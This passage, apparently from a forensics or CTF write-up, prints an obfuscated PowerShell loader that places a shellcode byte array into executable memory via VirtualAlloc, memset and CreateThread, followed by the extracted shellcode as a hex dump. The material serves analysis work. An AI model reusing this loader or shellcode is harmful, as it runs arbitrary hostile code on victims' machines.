class="mh">0xc7</span><span class="p">,</span><span class="w"> </span><span class="mh">0x57</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x13</span><span class="p">,</span><span class="w"> </span><span class="mh">0x06</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcd</span><span class="p">,</span><span class="w"> </span><span class="mh">0x39</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdb</span><span class="p">,</span><span class="w"> </span><span class="mh">0x73</span><span class="p">,</span><span class="w"> </span><span class="mh">0x43</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x43</span><span class="p">,</span><span class="w"> </span><span class="mh">0x81</span><span class="p">,</span><span class="w"> </span><span class="mh">0x24</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfa</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcb</span><span class="p">,</span><span class="w"> </span><span class="mh">0x94</span><span class="p">,</span><span class="w"> </span><span class="mh">0x78</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x78</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x57</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfd</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x38</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x11</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xce</span><span class="p">,</span><span class="w"> </span><span class="mh">0x18</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x89</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x09</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2a</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14</span><span class="p">,</span><span class="w"> </span><span class="mh">0x56</span><span class="p">,</span><span class="w"> </span><span class="mh">0x64</span><span class="p">,</span><span class="w"> </span><span class="mh">0x42</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xff</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb2</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbc</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfb</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x55</span><span class="p">,</span><span class="w"> </span><span class="mh">0xba</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbf</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0x88</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x34</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfb</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfb</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x27</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3a</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x64</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x38</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x10</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x68</span><span class="p">,</span><span class="w"> </span><span class="mh">0x84</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x54</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x52</span><span class="p">,</span><span class="w"> </span><span class="mh">0x25</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x74</span><span class="p">,</span><span class="w"> </span><span class="mh">0x57</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x72</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x81</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x82</span><span class="p">,</span><span class="w"> </span><span class="mh">0x77</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4c</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe8</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x00</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x48</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xac</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x32</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x38</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcc</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe2</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x13</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcf</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe2</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x13</span><span class="p">,</span><span class="w"> </span><span class="mh">0x87</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x35</span><span class="p">,</span><span class="w"> </span><span class="mh">0x12</span><span class="p">,</span><span class="w"> </span><span class="mh">0x16</span><span class="p">,</span><span class="w"> </span><span class="mh">0x70</span><span class="p">,</span><span class="w"> </span><span class="mh">0x46</span><span class="p">,</span><span class="w"> </span><span class="mh">0x55</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x41</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcd</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x55</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x14</span><span class="p">,</span><span class="w"> </span><span class="mh">0x05</span><span class="p">,</span><span class="w"> </span><span class="mh">0x29</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed</span><span class="p">,</span><span class="w"> </span><span class="mh">0xec</span><span class="p">,</span><span class="w"> </span><span class="mh">0x40</span><span class="p">,</span><span class="w"> </span><span class="mh">0x36</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbf</span><span class="p">,</span><span class="w"> </span><span class="mh">0x01</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x34</span><span class="p">,</span><span class="w"> </span><span class="mh">0x17</span><span class="p">,</span><span class="w"> </span><span class="mh">0xae</span><span class="p">,</span><span class="w"> </span><span class="mh">0x34</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x55</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x80</span><span class="p">,</span><span class="w"> </span><span class="mh">0x33</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf9</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x4d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x23</span><span class="p">,</span><span class="w"> </span><span class="mh">0xe1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x75</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xbe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7a</span><span class="p">,</span><span class="w"> </span><span class="mh">0x56</span><span class="p">,</span><span class="w"> </span><span class="mh">0x9e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x23</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x85</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc0</span><span class="p">,</span><span class="w"> </span><span class="mh">0xcb</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd2</span><span class="p">,</span><span class="w"> </span><span class="mh">0x65</span><span class="p">,</span><span class="w"> </span><span class="mh">0x50</span><span class="p">,</span><span class="w"> </span><span class="mh">0x67</span><span class="p">,</span><span class="w"> </span><span class="mh">0x64</span><span class="p">,</span><span class="w"> </span><span class="mh">0x23</span><span class="p">,</span><span class="w"> </span><span class="mh">0x06</span><span class="p">,</span><span class="w"> </span><span class="mh">0x04</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfc</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x86</span><span class="p">,</span><span class="w"> </span><span class="mh">0x44</span><span class="p">,</span><span class="w"> </span><span class="mh">0x75</span><span class="p">,</span><span class="w"> </span><span class="mh">0x5b</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x27</span><span class="p">,</span><span class="w"> </span><span class="mh">0xed</span><span class="p">,</span><span class="w"> </span><span class="mh">0xdc</span><span class="p">,</span><span class="w"> </span><span class="mh">0x25</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf4</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x92</span><span class="p">,</span><span class="w"> </span><span class="mh">0x93</span><span class="p">,</span><span class="w"> </span><span class="mh">0x83</span><span class="p">,</span><span class="w"> </span><span class="mh">0x21</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0d</span><span class="p">,</span><span class="w"> </span><span class="mh">0xca</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x25</span><span class="p">,</span><span class="w"> </span><span class="mh">0x84</span><span class="p">,</span><span class="w"> </span><span class="mh">0x24</span><span class="p">,</span><span class="w"> </span><span class="mh">0x47</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf0</span><span class="p">,</span><span class="w"> </span><span class="mh">0x65</span><span class="p">,</span><span class="w"> </span><span class="mh">0x37</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc8</span><span class="p">,</span><span class="w"> </span><span class="mh">0x61</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd9</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc4</span><span class="p">,</span><span class="w"> </span><span class="mh">0x62</span><span class="p">,</span><span class="w"> </span><span class="mh">0x0f</span><span class="p">,</span><span class="w"> </span><span class="mh">0xee</span><span class="p">,</span><span class="w"> </span><span class="mh">0x1a</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfa</span><span class="p">,</span><span class="w"> </span><span class="mh">0x84</span><span class="p">,</span><span class="w"> </span><span class="mh">0x69</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3e</span><span class="p">,</span><span class="w"> </span><span class="mh">0xc5</span><span class="p">,</span><span class="w"> </span><span class="mh">0x56</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf3</span><span class="p">,</span><span class="w"> </span><span class="mh">0x8e</span><span class="p">,</span><span class="w"> </span><span class="mh">0x47</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6d</span><span class="p">,</span><span class="w"> </span><span class="mh">0x81</span><span class="p">,</span><span class="w"> </span><span class="mh">0xd7</span><span class="p">,</span><span class="w"> </span><span class="mh">0xfe</span><span class="p">,</span><span class="w"> </span><span class="mh">0x22</span><span class="p">,</span><span class="w"> </span><span class="mh">0x36</span><span class="p">,</span><span class="w"> </span><span class="mh">0x6b</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa6</span><span class="p">,</span><span class="w"> </span><span class="mh">0xa3</span><span class="p">,</span><span class="w"> </span><span class="mh">0xf5</span><span class="p">,</span><span class="w"> </span><span class="mh">0xb6</span><span class="p">,</span><span class="w"> </span><span class="mh">0x7f</span><span class="p">,</span><span class="w"> </span><span class="mh">0x2c</span><span class="p">;</span>

<span class="n">#qzxth</span>
<span class="w">        </span><span class="nx">$pr</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]</span><span class="o">::</span><span class="nx">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="nx">gproc</span><span class="w"> </span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="w"> </span><span class="nx">VirtualAlloc</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="nx">gdelegate</span><span class="w"> </span><span class="err">@</span><span class="p">([</span><span class="nx">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="nx">UInt32</span><span class="p">])))).</span><span class="nx">Invoke</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">$sc32</span><span class="p">.</span><span class="nx">Length</span><span class="p">,</span><span class="w"> </span><span class="mh">0x3000</span><span class="p">,</span><span class="w"> </span><span class="mh">0x40</span><span class="p">);</span>

<span class="n">#tjmthqc</span>
<span class="w">        </span><span class="k">if</span><span class="w"> </span><span class="p">(</span><span class="nx">$pr</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">ne</span><span class="w"> </span><span class="mf">0</span><span class="p">)</span><span class="w">  </span><span class="p">{</span>
<span class="w">            </span><span class="nx">$memset</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="p">([</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]</span><span class="o">::</span><span class="nx">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="nx">gproc</span><span class="w"> </span><span class="nx">msvcrt</span><span class="p">.</span><span class="nx">dll</span><span class="w"> </span><span class="nx">memset</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="nx">gdelegate</span><span class="w"> </span><span class="err">@</span><span class="p">([</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="nx">IntPtr</span><span class="p">]))));</span>

<span class="n">#olpavrabqz</span>
<span class="w">            </span><span class="k">for</span><span class="w"> </span><span class="p">(</span><span class="nx">$i</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mf">0</span><span class="p">;</span>
<span class="w">            </span><span class="nx">$i</span><span class="w">  </span><span class="o">-</span><span class="w"> </span><span class="nx">le</span><span class="w"> </span><span class="p">(</span><span class="nx">$sc32</span><span class="p">.</span><span class="nx">Length</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mf">1</span><span class="p">);</span>
<span class="w">            </span><span class="nx">$i</span><span class="o">++</span><span class="p">)</span><span class="w"> </span><span class="p">{</span>
<span class="w">                </span><span class="nx">$memset</span><span class="p">.</span><span class="nx">Invoke</span><span class="p">((</span><span class="nx">$pr</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="nx">$i</span><span class="p">),</span><span class="w"> </span><span class="nx">$sc32</span><span class="p">[</span><span class="nx">$i</span><span class="p">],</span><span class="w"> </span><span class="mf">1</span><span class="p">)</span>
<span class="w">            </span><span class="p">};</span>

<span class="n">#kryt</span>
<span class="w">            </span><span class="p">([</span><span class="nx">System</span><span class="p">.</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">InteropServices</span><span class="p">.</span><span class="nx">Marshal</span><span class="p">]</span><span class="o">::</span><span class="nx">GetDelegateForFunctionPointer</span><span class="p">((</span><span class="nx">gproc</span><span class="w"> </span><span class="nx">kernel32</span><span class="p">.</span><span class="nx">dll</span><span class="w"> </span><span class="nx">CreateThread</span><span class="p">),</span><span class="w"> </span><span class="p">(</span><span class="nx">gdelegate</span><span class="w"> </span><span class="err">@</span><span class="p">([</span><span class="nx">IntPtr</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">UInt32</span><span class="p">],</span><span class="w"> </span><span class="p">[</span><span class="nx">IntPtr</span><span class="p">])</span><span class="w"> </span><span class="p">([</span><span class="nx">IntPtr</span><span class="p">])))).</span><span class="nx">Invoke</span><span class="p">(</span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="nx">$pr</span><span class="p">,</span><span class="w"> </span><span class="nx">$pr</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">,</span><span class="w"> </span><span class="mf">0</span><span class="p">);</span>

<span class="n">#sqzuzy</span>
<span class="w">        </span><span class="p">}</span>

<span class="w">        </span><span class="nx">sleep</span><span class="p">(</span><span class="mf">1200</span><span class="p">);</span>
<span class="w">    </span><span class="p">}</span><span class="w"> </span><span class="k">catch</span><span class="w"> </span><span class="p">{}</span>

<span class="w">    </span><span class="nx">exit</span><span class="p">;</span>

<span class="n">#akduah</span>
<span class="n">#pirvneznqvvcfyqlbdtfhh</span>
</code></pre></div>
</li>
<li>
<p>Extracted shellcode: /tmp/recovered_flag/orhmkbye_sc32.bin</p>
<div class="highlight"><pre><span></span><code><span class="nx">dac1</span><span class="w"> </span><span class="nx">bae6</span><span class="w"> </span><span class="mf">64</span><span class="nx">fa</span><span class="w"> </span><span class="mf">72</span><span class="nx">d9</span><span class="w"> </span><span class="mf">7424</span><span class="w"> </span><span class="nx">f458</span><span class="w"> </span><span class="mf">2</span><span class="nx">bc9</span><span class="w"> </span><span class="nx">b158</span>
<span class="mf">3150</span><span class="w"> </span><span class="mf">1783</span><span class="w"> </span><span class="nx">e8fc</span><span class="w"> </span><span class="mo">03</span><span class="nx">b6</span><span class="w"> </span><span class="mf">7718</span><span class="w"> </span><span class="mf">87</span><span class="nx">ca</span><span class="w"> </span><span class="mf">305</span><span class="nx">f</span><span class="w"> </span><span class="mf">8</span><span class="nx">cc2</span>
<span class="mf">299</span><span class="nx">f</span><span class="w"> </span><span class="mf">4</span><span class="nx">d22</span><span class="w"> </span><span class="nx">aa61</span><span class="w"> </span><span class="mf">1</span><span class="nx">f63</span><span class="w"> </span><span class="nx">fa33</span><span class="w"> </span><span class="nx">ce35</span><span class="w"> </span><span class="nx">b282</span><span class="w"> </span><span class="mf">22</span><span class="nx">dc</span>
<span class="mf">0</span><span class="nx">a6e</span><span class="w"> </span><span class="mf">907</span><span class="nx">e</span><span class="w"> </span><span class="nx">c3fb</span><span class="w"> </span><span class="mf">4766</span><span class="w"> </span><span class="mf">9</span><span class="nx">b70</span><span class="w"> </span><span class="mf">35</span><span class="nx">b6</span><span class="w"> </span><span class="mf">530</span><span class="nx">c</span><span class="w"> </span><span class="nx">c8e6</span>
<span class="mf">2</span><span class="nx">b1d</span><span class="w"> </span><span class="mf">9</span><span class="nx">a4c</span><span class="w"> </span><span class="nx">e66c</span><span class="w"> </span><span class="nx">d599</span><span class="w"> </span><span class="nx">be5f</span><span class="w"> </span><span class="nx">d5b5</span><span class="w"> </span><span class="mo">03</span><span class="nx">c1</span><span class="w"> </span><span class="nx">a9c7</span>
<span class="mf">5721</span><span class="w"> </span><span class="mf">1306</span><span class="w"> </span><span class="mf">6e2</span><span class="nx">c</span><span class="w"> </span><span class="nx">d289</span><span class="w"> </span><span class="nx">b0cd</span><span class="w"> </span><span class="mf">39</span><span class="nx">db</span><span class="w"> </span><span class="mf">7343</span><span class="w"> </span><span class="mf">8</span><span class="nx">a50</span>
<span class="mf">2143</span><span class="w"> </span><span class="mf">8124</span><span class="w"> </span><span class="nx">facb</span><span class="w"> </span><span class="mf">9478</span><span class="w"> </span><span class="mf">894</span><span class="nx">c</span><span class="w"> </span><span class="mf">1e78</span><span class="w"> </span><span class="mf">8e4</span><span class="nx">c</span><span class="w"> </span><span class="mf">57</span><span class="nx">fd</span>
<span class="mf">4e38</span><span class="w"> </span><span class="mo">00</span><span class="nx">b5</span><span class="w"> </span><span class="mf">4</span><span class="nx">f11</span><span class="w"> </span><span class="mf">9</span><span class="nx">ece</span><span class="w"> </span><span class="mf">1889</span><span class="w"> </span><span class="mf">5</span><span class="nx">b5b</span><span class="w"> </span><span class="nx">d889</span><span class="w"> </span><span class="mf">2</span><span class="nx">a5a</span>
<span class="mf">092</span><span class="nx">a</span><span class="w"> </span><span class="nx">fa14</span><span class="w"> </span><span class="mf">5664</span><span class="w"> </span><span class="mf">422</span><span class="nx">f</span><span class="w"> </span><span class="mf">9</span><span class="nx">cff</span><span class="w"> </span><span class="mf">0</span><span class="nx">d2e</span><span class="w"> </span><span class="mf">0</span><span class="nx">bb2</span><span class="w"> </span><span class="nx">bcf9</span>
<span class="nx">fb7c</span><span class="w"> </span><span class="mf">7</span><span class="nx">f55</span><span class="w"> </span><span class="nx">babf</span><span class="w"> </span><span class="nx">b6a8</span><span class="w"> </span><span class="mf">7</span><span class="nx">c41</span><span class="w"> </span><span class="mf">888</span><span class="nx">a</span><span class="w"> </span><span class="mf">9e34</span><span class="w"> </span><span class="nx">fba6</span>
<span class="mf">5</span><span class="nx">dfb</span><span class="w"> </span><span class="nx">df3e</span><span class="w"> </span><span class="mf">273</span><span class="nx">a</span><span class="w"> </span><span class="nx">f14b</span><span class="w"> </span><span class="mf">7</span><span class="nx">f64</span><span class="w"> </span><span class="nx">b538</span><span class="w"> </span><span class="mf">3</span><span class="nx">fb1</span><span class="w"> </span><span class="mf">7</span><span class="nx">c3f</span>
<span class="mf">10</span><span class="nx">df</span><span class="w"> </span><span class="mf">3</span><span class="nx">fb4</span><span class="w"> </span><span class="mf">9</span><span class="nx">c68</span><span class="w"> </span><span class="mf">8441</span><span class="w"> </span><span class="nx">dc74</span><span class="w"> </span><span class="mf">4</span><span class="nx">d54</span><span class="w"> </span><span class="mf">0</span><span class="nx">dc5</span><span class="w"> </span><span class="nx">c652</span>
<span class="mf">258</span><span class="nx">e</span><span class="w"> </span><span class="nx">d98a</span><span class="w"> </span><span class="mf">7457</span><span class="w"> </span><span class="mf">9</span><span class="nx">b72</span><span class="w"> </span><span class="mf">293</span><span class="nx">e</span><span class="w"> </span><span class="mf">41</span><span class="nx">c3</span><span class="w"> </span><span class="mf">8</span><span class="nx">d81</span><span class="w"> </span><span class="mf">2</span><span class="nx">c82</span>
<span class="mf">774</span><span class="nx">a</span><span class="w"> </span><span class="mf">4</span><span class="nx">ce8</span><span class="w"> </span><span class="nx">a80b</span><span class="w"> </span><span class="mo">000</span><span class="nx">f</span><span class="w"> </span><span class="mf">48</span><span class="nx">d3</span><span class="w"> </span><span class="nx">e5b6</span><span class="w"> </span><span class="nx">d3ac</span><span class="w"> </span><span class="mf">6e5</span><span class="nx">a</span>
<span class="mf">0</span><span class="nx">d7b</span><span class="w"> </span><span class="mf">8</span><span class="nx">ea5</span><span class="w"> </span><span class="mf">32</span><span class="nx">d9</span><span class="w"> </span><span class="mf">38e3</span><span class="w"> </span><span class="nx">cce2</span><span class="w"> </span><span class="nx">b813</span><span class="w"> </span><span class="nx">cfe2</span><span class="w"> </span><span class="nx">b813</span>
